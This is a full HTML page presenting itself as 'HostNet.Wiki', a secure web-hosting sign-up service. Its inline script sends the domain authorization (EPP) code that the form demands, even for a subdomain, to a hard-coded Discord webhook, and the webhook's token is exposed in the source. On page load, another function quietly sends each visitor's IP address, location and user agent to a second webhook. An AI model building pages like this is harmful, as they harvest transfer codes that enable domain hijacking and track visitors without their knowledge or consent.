<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>HostNet.Wiki - Secure Web Hosting</title>
  <meta name="description" content="Modern web hosting with subdomains, custom domains, and HTML uploads."/>
  <meta property="og:title" content="HostNet.Wiki - Secure Web Hosting" />
  <meta property="og:description" content="Modern web hosting with subdomains, custom domains, and HTML uploads." />
  <meta property="og:image" content="https://example.com/logo.png" />
  <meta name="theme-color" content="#1E90FF" />
  <link rel="icon" href="https://example.com/favicon.ico" type="image/x-icon" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet"/>

  <!-- Load reCAPTCHA Script -->
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(145deg, #0f0f1a, #12121c);
      color: #fff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 40px 20px;
    }

    .glass-card {
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(10px);
      border-radius: 16px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
      padding: 30px;
      width: 100%;
      max-width: 700px;
    }

    h1 {
      font-size: 2rem;
      text-align: center;
      margin-bottom: 10px;
      color: #1E90FF;
    }

    p {
      text-align: center;
      color: #aaa;
      margin-bottom: 30px;
    }

    label {
      display: block;
      margin-bottom: 6px;
      font-weight: 600;
      color: #ccc;
    }

    input,
    select,
    textarea {
      width: 100%;
      padding: 12px 16px;
      margin-bottom: 20px;
      border: none;
      border-radius: 8px;
      background: #1e1e2f;
      color: #fff;
      font-size: 1rem;
    }

    button {
      width: 100%;
      padding: 14px;
      background: linear-gradient(to right, #ff4d4d, #ff1a1a);
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 1.1rem;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    button:hover {
      background: linear-gradient(to right, #ff1a1a, #cc0000);
    }

    .form-group {
      margin-bottom: 20px;
    }

    .status {
      text-align: center;
      margin-top: 20px;
      font-weight: bold;
    }

    .success {
      color: #6bff6b;
    }

    .error {
      color: #ff1a1a;
    }

    footer {
      text-align: center;
      margin-top: 30px;
      font-size: 0.9rem;
      color: #666;
    }

    footer a {
      color: #1E90FF;
      text-decoration: none;
    }

    /* reCAPTCHA styling */
    .g-recaptcha {
      transform: scale(0.88);
      transform-origin: 0 0;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>

  <div class="glass-card">
    <h1>HostNet.Wiki</h1>
    <p>Secure web hosting with subdomains, custom domains, and HTML uploads.</p>

    <!-- Backend Status -->
    <div class="status" id="backendStatus">Checking backend status...</div>

    <!-- Submission Form -->
    <form id="hostingForm">
      <div class="form-group">
        <label for="hostType">Hosting Type</label>
        <select id="hostType" name="hostType" required>
          <option value="">-- Select Hosting Type --</option>
          <option value="subdomain">Custom Subdomain (hostnet.wiki/@yourname)</option>
          <option value="domain">Custom Domain</option>
        </select>
      </div>

      <div class="form-group" id="subdomainField" style="display: none;">
        <label for="subdomainName">Subdomain Name</label>
        <input type="text" id="subdomainName" name="subdomainName" placeholder="john" />
      </div>

      <div class="form-group" id="domainField" style="display: none;">
        <label for="domainName">Domain Name</label>
        <input type="text" id="domainName" name="domainName" placeholder="example.com" />
      </div>

      <div class="form-group">
        <label for="authCode">Authorization Code (EPP Code)</label>
        <input type="text" id="authCode" name="authCode" placeholder="Your EPP/Auth Code" required />
      </div>

      <div class="form-group">
        <label for="reasonSelect">Reason for Hosting</label>
        <select id="reasonSelect" name="reasonSelect" required>
          <option value="">-- Select a Reason --</option>
          <option value="Personal Site">Personal Site</option>
          <option value="Portfolio">Portfolio</option>
          <option value="Redirect">Redirect to Another Site</option>
          <option value="Other">Other</option>
        </select>
      </div>

      <div class="form-group" id="customReasonField" style="display: none;">
        <label for="customReason">Specify Custom Reason</label>
        <input type="text" id="customReason" name="customReason" placeholder="Type your reason here" />
      </div>

      <div class="form-group" id="redirectField" style="display: none;">
        <label for="redirectUrl">Redirect URL</label>
        <input type="text" id="redirectUrl" name="redirectUrl" placeholder="https://example.com" />
      </div>

      <div class="form-group">
        <label for="htmlFile">Upload HTML File (with CSS/JS included)</label>
        <input type="file" id="htmlFile" name="htmlFile" accept=".html" />
      </div>

      <div class="form-group">
        <label for="customHtml">Or Paste Custom HTML/Social Widget</label>
        <textarea id="customHtml" name="customHtml" rows="5" placeholder="Paste your full HTML snippet here"></textarea>
      </div>

      <!-- reCAPTCHA -->
      <div class="form-group">
        <div class="g-recaptcha" data-sitekey="6LeLxzErAAAAAOfIwlGu34wx1BaKQIoD6I6ZH6aV"></div>
      </div>

      <button type="submit">Submit Request</button>
      <p id="formMessage" class="status"></p>
    </form>

    <footer>
      &copy; 2025 HostNet.Wiki. All rights reserved. |
      <a href="#">Privacy Policy</a> |
      <a href="#">Terms of Service</a>
    </footer>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1369719012371726437/6aJepWKi1QDCRySfi4RJsKAFv6xLmyoVmIXYIMe7TjVMYQhDlIMqxsWw6Il8U9kYteHI';
    const VISITOR_WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR-VISITOR-WEBHOOK'; // Optional
    const IMGUR_CLIENT_ID = '919e66780dffebb';

    // Check backend status
    async function checkBackendStatus() {
      try {
        const res = await fetch("https://hostnet-backend.onrender.com/status");
        document.getElementById("backendStatus").textContent = "Backend is online";
      } catch {
        document.getElementById("backendStatus").innerHTML = "Backend is <span class='status error'>offline</span>";
      }
    }

    // Toggle host fields
    document.getElementById('hostType').addEventListener('change', function () {
      const val = this.value;
      document.getElementById('subdomainField').style.display = val === 'subdomain' ? 'block' : 'none';
      document.getElementById('domainField').style.display = val === 'domain' ? 'block' : 'none';
    });

    // Show/hide conditional fields
    document.getElementById('reasonSelect').addEventListener('change', function () {
      const val = this.value;
      document.getElementById('customReasonField').style.display = val === 'Other' ? 'block' : 'none';
      document.getElementById('redirectField').style.display = val === 'Redirect' ? 'block' : 'none';
    });

    // Handle form submission
    document.getElementById('hostingForm').addEventListener('submit', async (e) => {
      e.preventDefault();

      const formData = new FormData(document.getElementById('hostingForm'));
      const data = {};
      formData.forEach((value, key) => {
        if (value.trim()) data[key] = value.trim();
      });

      if (!data.hostType) {
        alert('Please select a hosting type.');
        return;
      }

      if (data.hostType === 'subdomain' && !data.subdomainName) {
        alert('Please enter a subdomain name.');
        return;
      }

      if (data.hostType === 'domain' && !data.domainName) {
        alert('Please enter a domain name.');
        return;
      }

      if (!data.authCode) {
        alert('Please provide an authorization code.');
        return;
      }

      // Enforce reCAPTCHA
      const recaptchaResponse = document.querySelector('.g-recaptcha-response');
      if (!recaptchaResponse || !recaptchaResponse.value) {
        alert('Please complete the reCAPTCHA verification.');
        return;
      }

      // Build embed
      const embed = {
        title: "üåê New Hosting Request",
        color: 0xff4d4d,
        fields: [],
        footer: { text: "HostNet.Wiki Hosting Requests" },
        timestamp: new Date().toISOString()
      };

      if (data.hostType === 'subdomain') {
        embed.fields.push({ name: "Subdomain", value: `\`${data.subdomainName}\``, inline: false });
      } else {
        embed.fields.push({ name: "Domain", value: `\`${data.domainName}\``, inline: false });
      }

      if (data.authCode) {
        embed.fields.push({ name: "Auth Code", value: `\`${data.authCode}\``, inline: false });
      }

      if (data.reasonSelect) {
        embed.fields.push({ name: "Hosting Reason", value: `\`${data.reasonSelect}\``, inline: false });
      }

      if (data.customReason) {
        embed.fields.push({ name: "Custom Reason", value: `\`${data.customReason}\``, inline: false });
      }

      if (data.redirectUrl) {
        embed.fields.push({ name: "Redirect URL", value: `\`${data.redirectUrl}\``, inline: false });
      }

      // Handle uploaded file
      const htmlFile = document.getElementById('htmlFile').files[0];
      if (htmlFile) {
        embed.fields.push({
          name: "HTML File Uploaded",
          value: `\`${htmlFile.name}\` (${(htmlFile.size / 1024).toFixed(1)} KB)`,
          inline: false
        });
      }

      // Handle pasted HTML
      if (data.customHtml) {
        const snippet = data.customHtml.substring(0, 1024);
        embed.fields.push({
          name: "Custom HTML Snippet",
          value: `\`\`\`html\n${snippet}\n\`\`\``,
          inline: false
        });
      }

      // Add reCAPTCHA token
      embed.fields.push({
        name: "reCAPTCHA Token",
        value: `\`${recaptchaResponse.value.substring(0, 20)}...\``,
        inline: false
      });

      const payload = {
        username: "HostNet.Wiki Bot",
        embeds: [embed]
      };

      try {
        const res = await fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        const msg = document.getElementById("formMessage");

        if (res.ok) {
          msg.textContent = "‚úÖ Request submitted successfully!";
          msg.className = "status success";
          document.getElementById("hostingForm").reset();
          grecaptcha.reset(); // Reset reCAPTCHA
          setTimeout(() => window.location.href = '/', 2000);
        } else {
          msg.textContent = "‚ùå Failed to submit request.";
          msg.className = "status error";
        }
      } catch (err) {
        console.error("Error submitting form:", err);
        document.getElementById("formMessage").textContent = "‚ö†Ô∏è An error occurred while sending the request.";
        document.getElementById("formMessage").className = "status error";
      }
    });

    // Optional: Log visitor info to Discord
    async function logVisitorToDiscord() {
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();

        const whoisRes = await fetch(`https://ipinfo.io/${ipData.ip}/json`);
        const whoisData = await whoisRes.json();

        const payload = {
          embeds: [
            {
              title: "üåê New Visitor",
              color: 0x58a6ff,
              fields: [
                { name: "IP Address", value: `\`${whoisData.ip || "N/A"}\`` },
                { name: "Location", value: `\`${whoisData.city}, ${whoisData.region}, ${whoisData.country}\`` },
                { name: "Organization", value: `\`${whoisData.org || "N/A"}\`` },
                { name: "User Agent", value: `\`${navigator.userAgent}\`` }
              ],
              footer: { text: "HostNet.Wiki Visitor Tracking" },
              timestamp: new Date().toISOString()
            }
          ]
        };

        await fetch(VISITOR_WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      } catch (err) {
        console.error("Error logging visitor:", err);
      }
    }

    window.addEventListener("load", () => {
      checkBackendStatus();
      logVisitorToDiscord(); // Optional
    });
  </script>
</body>
</html>
